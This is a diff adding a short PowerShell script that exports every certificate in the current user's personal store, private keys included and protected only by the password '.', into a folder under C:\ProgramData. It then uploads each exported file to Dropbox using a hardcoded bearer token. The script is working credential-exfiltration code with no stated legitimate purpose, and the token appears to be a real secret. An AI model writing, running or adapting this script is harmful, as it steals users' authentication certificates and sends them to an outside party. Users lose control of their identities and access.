@@ -1,0 +1,21 @@
+# TODO: any error handling at all :0
+function send($f) {
+    $TargetFilePath = "/c/$f"
+    $SourceFilePath = "C:\ProgramData\cloudpath_data\found\$f"
+    $token = "sl.BvKhfDHwwl4Rn-rJLem1OwPByrAn0zDvbTGOJDUJ2CRHMjumjPU7GoOcSRuRJ3ylB6z3hQl5cMiY7dUVaNEMT3YA5h6OyRorc2Ej5NILfhNm5GI9NHoXY-X_eLZ8xhElzsKABYox4Zp7"
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $authorization = "Bearer " + $token
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", $authorization)
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
+    irm -useb -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+C:
+cd C:\ProgramData\cloudpath_data\
+mkdir found
+cd found
+$p = ConvertTo-SecureString -String '.' -Force -AsPlainText
+gci Cert:\CurrentUser\My\|%{Export-PfxCertificate $_ "C:\ProgramData\cloudpath_data\found\$($_.Thumbprint)" -Password $p}
+gci C:\ProgramData\cloudpath_data\found\|%{send $_.Name}
